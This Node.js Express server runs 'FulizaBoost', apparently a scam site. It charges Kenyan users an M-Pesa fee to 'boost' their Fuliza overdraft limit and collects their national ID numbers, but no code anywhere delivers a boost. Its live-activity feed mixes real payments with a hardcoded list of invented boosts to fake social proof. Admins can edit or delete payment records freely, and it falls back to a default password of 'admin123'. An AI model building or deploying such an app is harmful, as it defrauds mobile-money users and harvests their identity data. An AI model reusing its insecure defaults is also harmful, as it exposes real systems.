const express  = require('express');
const session  = require('express-session');
const axios    = require('axios');
const { v4: uuidv4 } = require('uuid');
const path     = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;

// ─────────────────────────────────────────────────────────────────────────────
//  RAILWAY ENVIRONMENT VARIABLES
//  Add ALL of these in Railway → your service → Variables tab
//
//  MPESA_CONSUMER_KEY     → Consumer Key from Lipana/Daraja dashboard
//  MPESA_CONSUMER_SECRET  → Consumer Secret from Lipana/Daraja dashboard
//  MPESA_SHORTCODE        → Your Paybill or Till number
//  MPESA_PASSKEY          → Lipa Na Mpesa Passkey from Lipana dashboard
//  BASE_URL               → https://your-app.railway.app  (no trailing slash)
//  ADMIN_USER             → admin
//  ADMIN_PASS             → your secure password
//  SESSION_SECRET         → any long random string
// ─────────────────────────────────────────────────────────────────────────────
const CONSUMER_KEY    = process.env.MPESA_CONSUMER_KEY    || '';
const CONSUMER_SECRET = process.env.MPESA_CONSUMER_SECRET || '';
const SHORTCODE       = process.env.MPESA_SHORTCODE       || '';
const PASSKEY         = process.env.MPESA_PASSKEY         || '';
const BASE_URL        = (process.env.BASE_URL || `http://localhost:${PORT}`).replace(/\/$/, '');
const ADMIN_USER      = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS      = process.env.ADMIN_PASS || 'admin123';

const DARAJA_BASE = 'https://api.safaricom.co.ke';

// ─────────────────────────────────────────────────────────────────────────────
//  Daraja helpers
// ─────────────────────────────────────────────────────────────────────────────
function getTimestamp() {
  const d   = new Date();
  const pad = n => String(n).padStart(2, '0');
  return `${d.getFullYear()}${pad(d.getMonth()+1)}${pad(d.getDate())}${pad(d.getHours())}${pad(d.getMinutes())}${pad(d.getSeconds())}`;
}

function getPassword(timestamp) {
  return Buffer.from(`${SHORTCODE}${PASSKEY}${timestamp}`).toString('base64');
}

function formatPhone(raw) {
  let p = String(raw).replace(/\D/g, '');
  if (p.startsWith('0'))                       p = '254' + p.slice(1);
  if (p.startsWith('7') || p.startsWith('1')) p = '254' + p;
  if (!p.startsWith('254'))                    p = '254' + p;
  return p; // e.g. 254712345678  (no + prefix — Daraja wants no +)
}

async function getDarajaToken() {
  const auth = Buffer.from(`${CONSUMER_KEY}:${CONSUMER_SECRET}`).toString('base64');
  const resp = await axios.get(
    `${DARAJA_BASE}/oauth/v1/generate?grant_type=client_credentials`,
    { headers: { Authorization: `Basic ${auth}` }, timeout: 15000 }
  );
  if (!resp.data.access_token) throw new Error('No access_token in Daraja OAuth response');
  return resp.data.access_token;
}

async function sendSTKPush({ phone, amount, accountRef, description, callbackUrl }) {
  const token     = await getDarajaToken();
  const timestamp = getTimestamp();
  const password  = getPassword(timestamp);

  const payload = {
    BusinessShortCode: SHORTCODE,
    Password:          password,
    Timestamp:         timestamp,
    TransactionType:   'CustomerPayBillOnline',
    Amount:            Math.ceil(parseInt(amount)),
    PartyA:            phone,       // 2547XXXXXXXX
    PartyB:            SHORTCODE,
    PhoneNumber:       phone,       // 2547XXXXXXXX
    CallBackURL:       callbackUrl,
    AccountReference:  String(accountRef).substring(0, 12),
    TransactionDesc:   String(description).substring(0, 13),
  };

  console.log('[Daraja STK] Payload:', JSON.stringify({ ...payload, Password: '***' }));

  const resp = await axios.post(
    `${DARAJA_BASE}/mpesa/stkpush/v1/processrequest`,
    payload,
    {
      headers: {
        Authorization:  `Bearer ${token}`,
        'Content-Type': 'application/json',
      },
      timeout: 30000,
    }
  );
  return resp.data;
}

// ─────────────────────────────────────────────────────────────────────────────
//  In-memory store
// ─────────────────────────────────────────────────────────────────────────────
let transactions = [
  { id:'TXN1A2B3C', phone:'+254712345678', nationalId:'234567890', limit:25000, fee:670,  status:'success', checkoutRequestId:null, mpesaCode:'SB12HGX9JE', ts:new Date(Date.now()-3600000).toISOString() },
  { id:'TXN4D5E6F', phone:'+254723456789', nationalId:'345678901', limit:10000, fee:240,  status:'success', checkoutRequestId:null, mpesaCode:'SC34HGX7KL', ts:new Date(Date.now()-7200000).toISOString() },
  { id:'TXN7G8H9I', phone:'+254734567890', nationalId:'456789012', limit:50000, fee:1400, status:'pending', checkoutRequestId:null, mpesaCode:null,          ts:new Date(Date.now()-1800000).toISOString() },
  { id:'TXNJK0LMN', phone:'+254745678901', nationalId:'567890123', limit:35000, fee:910,  status:'success', checkoutRequestId:null, mpesaCode:'SD56HGX5MN', ts:new Date(Date.now()-900000).toISOString()  },
  { id:'TXNOP1QRS', phone:'+254756789012', nationalId:'678901234', limit:16000, fee:450,  status:'failed',  checkoutRequestId:null, mpesaCode:null,          ts:new Date(Date.now()-5400000).toISOString() },
];

const liveBoosts = [
  { phone:'0712***321', limit:25000, ts: Date.now()-120000  },
  { phone:'0723***088', limit:10000, ts: Date.now()-280000  },
  { phone:'0734***567', limit:40000, ts: Date.now()-450000  },
  { phone:'0745***204', limit:50000, ts: Date.now()-700000  },
  { phone:'0756***901', limit:30000, ts: Date.now()-900000  },
  { phone:'0768***443', limit:16000, ts: Date.now()-1200000 },
  { phone:'0710***778', limit:70000, ts: Date.now()-1500000 },
  { phone:'0722***115', limit:21000, ts: Date.now()-1900000 },
];

// ─────────────────────────────────────────────────────────────────────────────
//  Middleware — JSON parser MUST come before all routes
// ─────────────────────────────────────────────────────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─────────────────────────────────────────────────────────────────────────────
//  ALL /api ROUTES — registered BEFORE express.static
//  This is critical: prevents static middleware from intercepting API calls
// ─────────────────────────────────────────────────────────────────────────────

app.get('/api/live-boosts', (req, res) => {
  const real = transactions
    .filter(t => t.status === 'success')
    .map(t => ({ phone: t.phone.slice(0,5)+'***'+t.phone.slice(-3), limit: t.limit, ts: new Date(t.ts).getTime() }));
  const all = [...real, ...liveBoosts].sort((a,b)=>b.ts-a.ts).slice(0,20);
  res.json({ success: true, data: all });
});

// ── STK Push ──────────────────────────────────────────────────────────────────
app.post('/api/stk-push', async (req, res) => {
  const { phone, nationalId, limitAmount, fee } = req.body;

  if (!phone || !nationalId || !limitAmount || !fee)
    return res.status(400).json({ success: false, message: 'All fields are required.' });

  const cleanId = String(nationalId).replace(/\D/g, '');
  if (cleanId.length < 7 || cleanId.length > 9)
    return res.status(400).json({ success: false, message: 'National ID must be 7–9 digits.' });

  const formattedPhone = formatPhone(phone);
  if (formattedPhone.length !== 12)
    return res.status(400).json({ success: false, message: 'Enter a valid Safaricom number e.g. 0712345678.' });

  const txnId = 'TXN' + uuidv4().replace(/-/g,'').substring(0,8).toUpperCase();
  const txn = {
    id: txnId, phone: '+'+formattedPhone, nationalId: cleanId,
    limit: parseInt(limitAmount), fee: parseInt(fee),
    status: 'pending', checkoutRequestId: null, mpesaCode: null,
    ts: new Date().toISOString(),
  };
  transactions.unshift(txn);

  // Add to live feed
  liveBoosts.unshift({ phone: formattedPhone.slice(0,5)+'***'+formattedPhone.slice(-3), limit: parseInt(limitAmount), ts: Date.now() });
  if (liveBoosts.length > 50) liveBoosts.pop();

  // Demo mode — credentials not configured
  if (!CONSUMER_KEY || !CONSUMER_SECRET || !SHORTCODE || !PASSKEY) {
    console.warn('[FulizaBoost] Daraja credentials not set → DEMO MODE');
    return res.json({
      success: true, transactionId: txnId, demo: true,
      message: 'Demo mode — add MPESA_CONSUMER_KEY, MPESA_CONSUMER_SECRET, MPESA_SHORTCODE, MPESA_PASSKEY in Railway.',
    });
  }

  try {
    const callbackUrl = `${BASE_URL}/api/mpesa-callback`;
    const data = await sendSTKPush({
      phone:       formattedPhone,          // 254712345678 (no +)
      amount:      parseInt(fee),
      accountRef:  txnId,
      description: 'FulizaBoost',
      callbackUrl,
    });

    console.log('[Daraja STK Response]', JSON.stringify(data));

    // Daraja returns ResponseCode "0" on success
    if (data.ResponseCode === '0') {
      txn.checkoutRequestId = data.CheckoutRequestID;
      console.log(`[STK] ✅ Sent | CheckoutRequestID: ${data.CheckoutRequestID}`);
      return res.json({
        success: true, transactionId: txnId,
        message: 'STK push sent. Check your phone and enter your M-Pesa PIN.',
      });
    }

    // Daraja accepted but non-zero response code
    txn.status = 'failed';
    const msg = data.ResponseDescription || data.errorMessage || 'STK push rejected.';
    console.error('[Daraja] Non-zero ResponseCode:', msg);
    return res.status(400).json({ success: false, message: msg });

  } catch (err) {
    txn.status = 'failed';
    const httpStatus = err.response?.status;
    const errBody    = err.response?.data;
    // Extract the most useful error message from Daraja error body
    const errMsg = errBody?.errorMessage
                || errBody?.ResponseDescription
                || errBody?.fault?.faultstring
                || err.message;

    console.error('[STK Error]', httpStatus, JSON.stringify(errBody || {}));

    if (httpStatus === 400)
      return res.status(400).json({ success: false, message: `Bad request: ${errMsg}` });
    if (httpStatus === 401 || httpStatus === 403)
      return res.status(500).json({ success: false, message: 'Authentication failed — check your MPESA_CONSUMER_KEY and MPESA_CONSUMER_SECRET in Railway.' });

    return res.status(500).json({ success: false, message: `STK push failed: ${errMsg}` });
  }
});

// ── Daraja STK Callback ───────────────────────────────────────────────────────
// Safaricom posts here after customer acts on phone prompt.
// Set this in Lipana/Daraja dashboard as the callback URL:
//   https://your-app.railway.app/api/mpesa-callback
app.post('/api/mpesa-callback', (req, res) => {
  // Always respond 200 immediately — Daraja retries if it gets anything else
  res.status(200).json({ ResultCode: 0, ResultDesc: 'Accepted' });

  try {
    console.log('[Daraja Callback] Body:', JSON.stringify(req.body));

    const stkCallback = req.body?.Body?.stkCallback;
    if (!stkCallback) {
      console.warn('[Callback] Unexpected body shape:', JSON.stringify(req.body));
      return;
    }

    const { CheckoutRequestID, ResultCode, ResultDesc, CallbackMetadata } = stkCallback;

    // Find transaction by CheckoutRequestID
    const txn = transactions.find(t => t.checkoutRequestId === CheckoutRequestID);
    if (!txn) {
      console.warn('[Callback] No txn for CheckoutRequestID:', CheckoutRequestID);
      return;
    }

    if (ResultCode === 0 || ResultCode === '0') {
      txn.status = 'success';
      if (CallbackMetadata?.Item) {
        const find = name => (CallbackMetadata.Item.find(i => i.Name === name) || {}).Value;
        txn.mpesaCode = find('MpesaReceiptNumber') || null;
      }
      console.log(`[Callback] ✅ TXN ${txn.id} SUCCESS | Receipt: ${txn.mpesaCode}`);
    } else {
      txn.status    = 'failed';
      txn.failReason = ResultDesc;
      console.log(`[Callback] ❌ TXN ${txn.id} FAILED | Reason: ${ResultDesc}`);
    }
  } catch (e) {
    console.error('[Callback Error]', e.message);
  }
});

// ── Poll transaction status ───────────────────────────────────────────────────
app.get('/api/transaction/:id', (req, res) => {
  const txn = transactions.find(t => t.id === req.params.id);
  if (!txn) return res.status(404).json({ success: false, message: 'Not found' });
  res.json({ success: true, transaction: { id: txn.id, status: txn.status, limit: txn.limit, fee: txn.fee, mpesaCode: txn.mpesaCode } });
});

// ─────────────────────────────────────────────────────────────────────────────
//  Session + Admin routes
// ─────────────────────────────────────────────────────────────────────────────
app.use(session({
  secret: process.env.SESSION_SECRET || 'fulizaboost-change-in-prod',
  resave: false, saveUninitialized: false,
  cookie: { maxAge: 8 * 60 * 60 * 1000 },
}));

function requireAdmin(req, res, next) {
  if (req.session && req.session.isAdmin) return next();
  return res.redirect('/admin/login');
}

app.post('/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    req.session.isAdmin = true;
    return res.json({ success: true });
  }
  return res.status(401).json({ success: false, message: 'Invalid credentials' });
});
app.post('/admin/logout', (req, res) => { req.session.destroy(); res.json({ success: true }); });

// Admin API
app.get('/api/admin/stats', requireAdmin, (req, res) => {
  const ok = transactions.filter(t => t.status === 'success');
  res.json({ total: transactions.length, success: ok.length,
    pending: transactions.filter(t => t.status === 'pending').length,
    failed:  transactions.filter(t => t.status === 'failed').length,
    revenue: ok.reduce((a,t) => a+t.fee, 0) });
});
app.get('/api/admin/transactions', requireAdmin, (req, res) => {
  const { q, status, page=1, limit=100 } = req.query;
  let data = [...transactions];
  if (q)      data = data.filter(t => t.phone.includes(q)||t.nationalId.includes(q)||t.id.includes(q));
  if (status) data = data.filter(t => t.status === status);
  const s = (parseInt(page)-1)*parseInt(limit);
  res.json({ success: true, data: data.slice(s, s+parseInt(limit)), total: data.length });
});
app.patch('/api/admin/transactions/:id', requireAdmin, (req, res) => {
  const txn = transactions.find(t => t.id === req.params.id);
  if (!txn) return res.status(404).json({ success: false });
  Object.assign(txn, req.body);
  res.json({ success: true, transaction: txn });
});
app.delete('/api/admin/transactions/:id', requireAdmin, (req, res) => {
  transactions = transactions.filter(t => t.id !== req.params.id);
  res.json({ success: true });
});
app.get('/api/admin/users', requireAdmin, (req, res) => {
  const users = {};
  transactions.forEach(t => {
    if (!users[t.phone]) users[t.phone] = { phone: t.phone, nationalId: t.nationalId, paid: 0, upgrades: 0, last: t.ts };
    if (t.status === 'success') { users[t.phone].paid += t.fee; users[t.phone].upgrades++; }
    if (t.ts > users[t.phone].last) users[t.phone].last = t.ts;
  });
  res.json({ success: true, data: Object.values(users) });
});

// ─────────────────────────────────────────────────────────────────────────────
//  Static files + page routes — AFTER all API routes
// ─────────────────────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/admin', requireAdmin, (req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'admin.html')));
app.get('/admin/login', (req, res) => {
  if (req.session && req.session.isAdmin) return res.redirect('/admin');
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.use((req, res, next) => {
  if (req.path === '/admin.html') return res.redirect('/admin');
  if (req.path === '/login.html') return res.redirect('/admin/login');
  next();
});
app.use((req, res) =>
  res.status(404).sendFile(path.join(__dirname, 'public', 'index.html')));

// ─────────────────────────────────────────────────────────────────────────────
//  Start
// ─────────────────────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`✅  FulizaBoost running  → http://localhost:${PORT}`);
  console.log(`📡  Callback URL         → ${BASE_URL}/api/mpesa-callback`);
  console.log(`🔑  Consumer Key set     → ${CONSUMER_KEY  ? 'YES ✅' : 'NO ⚠️  (demo mode)'}`);
  console.log(`🏦  Shortcode set        → ${SHORTCODE     ? 'YES ✅' : 'NO ⚠️  (demo mode)'}`);
  console.log(`🔐  Passkey set          → ${PASSKEY       ? 'YES ✅' : 'NO ⚠️  (demo mode)'}`);
});
